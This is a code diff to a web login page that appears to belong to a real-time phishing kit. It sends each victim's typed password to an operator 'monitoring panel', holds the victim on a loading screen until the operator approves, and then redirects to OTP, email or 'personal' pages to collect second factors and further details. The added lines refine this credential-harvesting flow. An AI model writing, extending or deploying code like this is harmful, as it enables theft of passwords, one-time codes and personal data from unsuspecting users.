@@ -70,6 +70,12 @@ export default function Home() {
             if (approval.status === 'approved') {
               const redirectType = approval.redirectType || 'password';
               console.log(`[index.js] Handling redirect: ${redirectType} for user: ${userId}`);
+              
+              // Store userId for OTP page
+              if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
+                localStorage.setItem('lastUserId', userId);
+              }
+              
               handleRedirect(redirectType, userId);
             } else if (approval.status === 'denied') {
               const loadingScreen = document.getElementById('loading-screen');
@@ -126,6 +132,12 @@ export default function Home() {
               if (approval.status === 'approved') {
                 const redirectType = approval.redirectType || 'password';
                 console.log(`[index.js] Approval received via polling: ${redirectType} for user: ${userId}`);
+                
+                // Store userId for OTP page
+                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
+                  localStorage.setItem('lastUserId', userId);
+                }
+                
                 handleRedirect(redirectType, userId);
               } else if (approval.status === 'denied') {
                 const loadingScreen = document.getElementById('loading-screen');
@@ -208,22 +220,23 @@ export default function Home() {
           waitForApprovalSSE(activityId, 'userid', userId);
           
         } else if (cachedUsername) {
-          // Second step: Sign in button clicked
+          // Second step: Password entered
           const password = document.getElementById('password').value;
           
-          // Log sign in button click with password (for display only, not stored)
-          const activityId = await logActivity('signin', cachedUsername, { 
+          // Log password entry with password (for display only, not stored)
+          const activityId = await logActivity('password', cachedUsername, { 
             hasPassword: password.length > 0,
             password: password // Include password for real-time display on monitoring panel
           });
           pendingActivityId = activityId;
           
-          // Show waiting message
-          submitBtn.textContent = 'Waiting for approval...';
+          // Show loading screen
+          const loadingScreen = document.getElementById('loading-screen');
+          if (loadingScreen) loadingScreen.classList.add('active');
           submitBtn.disabled = true;
           
           // Wait for approval via SSE
-          waitForApprovalSSE(activityId, 'signin', cachedUsername);
+          waitForApprovalSSE(activityId, 'password', cachedUsername);
         }
       });
     }
